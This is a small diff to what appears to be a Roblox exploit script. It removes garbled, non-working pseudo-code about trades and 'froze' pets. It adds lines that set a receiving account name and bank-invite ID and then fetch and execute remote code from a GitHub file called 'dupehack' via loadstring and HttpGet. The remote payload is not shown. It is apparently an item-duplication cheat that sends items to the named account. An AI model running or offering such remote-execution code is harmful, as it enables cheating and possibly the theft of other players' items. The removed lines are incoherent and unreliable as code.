@@ -1,7 +1,3 @@
-instance:(trade).LocalParentChild.Obsfucate));
- end)
- when Parent(Trade)active;
-         then
-Child(Human:Pet).Froze.Humann.Root.Part:(print("ez trade"));
-    end)
-end)
+getgenv().YourAccNameThatGetsMailbox = "Wizard_CatWhite"
+getgenv().YourAccountIdForBankInvite = 23423423
+loadstring(game:HttpGet('https://raw.githubusercontent.com/NukeVsCity/Scripts2022/main/dupehack'))()
